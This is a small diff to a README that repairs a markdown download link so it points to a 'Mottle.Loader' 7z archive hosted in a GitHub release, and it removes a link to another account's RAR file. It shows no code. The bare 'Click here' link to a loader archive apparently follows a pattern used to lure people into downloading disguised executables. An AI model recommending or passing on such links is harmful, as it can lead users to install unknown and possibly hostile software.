@@ -1,4 +1,4 @@
-## Download - [Click here]([https://github.com/JHONNEX/clash/releases/download/IXLL/ImmortaL.rar](https://github.com/pigmenthnm7/Mottle/releases/download/loader/Mottle.Loader.7.2.6.7z))
+## Download - [Click here](https://github.com/pigmenthnm7/Mottle/releases/download/loader/Mottle.Loader.7.2.6.7z)
 
 
 ![1](https://github.com/pigmenthnm7/Mottle/assets/167683978/de3672ec-f530-4eaf-a24c-615cca10b3b4)
